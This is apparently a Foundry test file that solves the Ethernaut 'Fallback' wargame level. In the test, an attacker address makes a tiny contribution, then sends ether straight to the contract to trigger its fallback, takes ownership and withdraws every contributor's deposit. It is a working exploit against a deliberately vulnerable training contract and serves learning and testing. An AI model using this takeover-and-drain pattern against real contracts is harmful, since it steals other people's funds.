// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test} from "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackAttackTest is Test{
  Fallback fallbackContract;
  address owner;
  uint256 INITIAL_BALANCE = 1e18;
  
  function setUp() public {
    fallbackContract = new Fallback();
    owner = vm.addr(3);
    vm.deal(address(owner), INITIAL_BALANCE);
  }

  function testShouldStealContractBalance() public{
    address contribuitor1 = vm.addr(1);
    address contribuitor2 = vm.addr(2);
    vm.deal(contribuitor1, 1e18);
    vm.deal(contribuitor2, 1e18);

    vm.prank(contribuitor1);
    fallbackContract.contribute{value: 100 wei}();

    vm.prank(contribuitor2);
    fallbackContract.contribute{value: 100 wei}();

    // attack
    vm.startPrank(owner);

    // Contributing
    fallbackContract.contribute{value: 1}();
    
    // Sending eth
    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
    if(!success) revert();

    // Withdrawing all eth
    fallbackContract.withdraw();

    vm.stopPrank();

    assertEq(fallbackContract.contributions(owner), 1);
    assertEq(fallbackContract.owner(), owner);
    assertEq(address(owner).balance, INITIAL_BALANCE + 200);
  }
}